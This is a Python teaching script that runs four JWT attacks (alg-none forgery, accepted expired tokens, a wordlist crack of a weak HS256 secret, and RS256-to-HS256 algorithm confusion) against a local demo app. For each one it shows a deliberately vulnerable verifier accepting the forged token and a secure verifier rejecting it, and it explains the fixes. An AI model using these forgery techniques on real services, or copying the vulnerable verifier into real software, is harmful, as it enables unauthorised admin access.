"""
attacks.py
Runs the common JWT attacks against Zorig Console, and shows the secure
verifier stopping them.

Attacks 1 to 3 are tested against the running app through its /api/whoami
endpoint, which reports the role it read from the token. Attack 4, algorithm
confusion, needs its own RSA setup, so it is shown as a self contained scenario
at the end.

Start the server first:  python3 app.py
Then run:                python3 attacks.py
"""

import requests
import hmac
import hashlib
import time
import tokens as T

BASE = "http://127.0.0.1:5005"


def banner(n, title):
    print()
    print("=" * 72)
    print(f"  ATTACK {n}: {title}")
    print("=" * 72)


def line():
    print("-" * 72)


def check(token, mode):
    """Ask the app what role it reads from this token in the given mode."""
    r = requests.get(f"{BASE}/api/whoami", params={"mode": mode},
                     headers={"Authorization": "Bearer " + token})
    return r.json()


# ---------------------------------------------------------------------------
# 0. Baseline
# ---------------------------------------------------------------------------
def baseline():
    banner(0, "Baseline, a normal user token")
    print("pema.dolker logs in and gets a real token, role user, not admin.")
    line()
    tok = T.issue("pema.dolker", "user")
    print("vulnerable verifier:", check(tok, "vulnerable"))


# ---------------------------------------------------------------------------
# 1. alg none
# ---------------------------------------------------------------------------
def attack_alg_none():
    banner(1, "The alg none attack")
    print("The attacker takes a token, sets the header algorithm to \"none\",")
    print("puts role admin in the payload, and removes the signature entirely.")
    print("A verifier that trusts the header runs no signature check at all.")
    line()
    forged = T.forge_none("pema.dolker", "admin")
    print("forged token (note the empty third part):")
    print("  ", forged)
    print("vulnerable verifier:", check(forged, "vulnerable"))
    print("secure verifier    :", check(forged, "secure"))


# ---------------------------------------------------------------------------
# 2. Expired token accepted
# ---------------------------------------------------------------------------
def attack_expired():
    banner(2, "Expired token still accepted")
    print("A token that expired an hour ago should be refused. A verifier that")
    print("forgets to check the exp claim keeps honouring it forever, which")
    print("makes a stolen old token useful long after it should have died.")
    line()
    expired = T.issue("pema.dolker", "user", ttl=-3600)   # expired an hour ago
    print("vulnerable verifier:", check(expired, "vulnerable"))
    print("secure verifier    :", check(expired, "secure"))


# ---------------------------------------------------------------------------
# 3. Weak secret brute force
# ---------------------------------------------------------------------------
def attack_weak_secret():
    banner(3, "Weak signing secret, cracked by brute force")
    print("HS256 tokens are signed with a shared secret. If that secret is weak,")
    print("an attacker who has any real token can guess it offline, then sign")
    print("their own tokens that are completely valid.")
    line()

    # The attacker starts with one normal token (for example their own).
    real = T.issue("pema.dolker", "user")
    h, p, _ = real.split(".")
    signing_input = f"{h}.{p}".encode()
    real_sig = T.b64u_dec(real.split(".")[2])

    wordlist = ["password", "123456", "admin", "letmein", "qwerty",
                "secret", "jwt", "token", "cst", "zorig", "zorig2026", "changeme"]
    print(f"trying {len(wordlist)} common secrets against a real token...")
    found = None
    for guess in wordlist:
        test = hmac.new(guess.encode(), signing_input, hashlib.sha256).digest()
        if hmac.compare_digest(test, real_sig):
            found = guess
            break
    print("cracked secret:", found)

    forged = T.forge_hs256("pema.dolker", "admin", found.encode())
    print("forged a correctly signed admin token with the cracked secret.")
    print("vulnerable verifier:", check(forged, "vulnerable"))
    print("secure verifier    :", check(forged, "secure"),
          " <- note: even the secure verifier accepts it")
    print("A correctly signed token is valid by definition. The only fix here is")
    print("a long random secret that cannot be guessed, so the crack fails.")


# ---------------------------------------------------------------------------
# 4. Algorithm confusion, RS256 to HS256 (self contained scenario)
# ---------------------------------------------------------------------------
def attack_algorithm_confusion():
    banner(4, "Algorithm confusion, RS256 downgraded to HS256")
    print("Some servers sign with RS256, which uses a private key to sign and a")
    print("public key to verify. The public key is not a secret. The attack: the")
    print("attacker makes an HS256 token and uses the server's PUBLIC key as the")
    print("HMAC secret. A verifier that lets the token's header choose between")
    print("RS256 and HS256 will HMAC it with the public key and accept it.")
    line()

    from cryptography.hazmat.primitives.asymmetric import rsa, padding
    from cryptography.hazmat.primitives import hashes, serialization

    priv = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    pub = priv.public_key()
    pub_pem = pub.public_bytes(
        serialization.Encoding.PEM,
        serialization.PublicFormat.SubjectPublicKeyInfo)
    print("the server's PUBLIC key (known to everyone):")
    print("  ", pub_pem.decode().splitlines()[0], "...")

    import json

    def b64u(d): return T.b64u(d)

    # Attacker forges an HS256 token, using the public key PEM as the secret.
    header = {"alg": "HS256", "typ": "JWT"}
    payload = {"sub": "pema.dolker", "role": "admin", "exp": int(time.time()) + 3600}
    h = b64u(json.dumps(header, separators=(",", ":")).encode())
    p = b64u(json.dumps(payload, separators=(",", ":")).encode())
    sig = b64u(hmac.new(pub_pem, f"{h}.{p}".encode(), hashlib.sha256).digest())
    forged = f"{h}.{p}.{sig}"
    print("forged HS256 token signed with the public key as the secret.")

    # Vulnerable verifier: trusts the header, so it will HMAC with the public key.
    def verify_vuln_confusion(token):
        hh, pp, ss = token.split(".")
        hdr = json.loads(T.b64u_dec(hh))
        if hdr["alg"] == "HS256":
            exp = hmac.new(pub_pem, f"{hh}.{pp}".encode(), hashlib.sha256).digest()
            if hmac.compare_digest(T.b64u_dec(ss), exp):
                return json.loads(T.b64u_dec(pp))
        raise T.JWTError("rejected")

    # Secure verifier: pins RS256, so an HS256 token is refused outright.
    def verify_secure_confusion(token):
        hh, pp, ss = token.split(".")
        hdr = json.loads(T.b64u_dec(hh))
        if hdr["alg"] != "RS256":
            raise T.JWTError("algorithm not allowed (HS256 refused)")
        try:
            pub.verify(T.b64u_dec(ss), f"{hh}.{pp}".encode(),
                       padding.PKCS1v15(), hashes.SHA256())
        except Exception:
            raise T.JWTError("bad RSA signature")
        return json.loads(T.b64u_dec(pp))

    try:
        claims = verify_vuln_confusion(forged)
        print("vulnerable verifier: accepted, role =", claims["role"])
    except T.JWTError as e:
        print("vulnerable verifier: rejected,", e)

    try:
        verify_secure_confusion(forged)
        print("secure verifier    : accepted (should not happen)")
    except T.JWTError as e:
        print("secure verifier    : rejected,", e)


if __name__ == "__main__":
    print("Running JWT attacks against", BASE)
    baseline()
    attack_alg_none()
    attack_expired()
    attack_weak_secret()
    attack_algorithm_confusion()
    print()
    line()
    print("Summary: every attack that forged a token without the real secret was")
    print("stopped by the secure verifier, which pins the algorithm, checks the")
    print("signature, and checks expiry. The one attack that still works, the")
    print("cracked weak secret, is fixed by using a long random secret.")
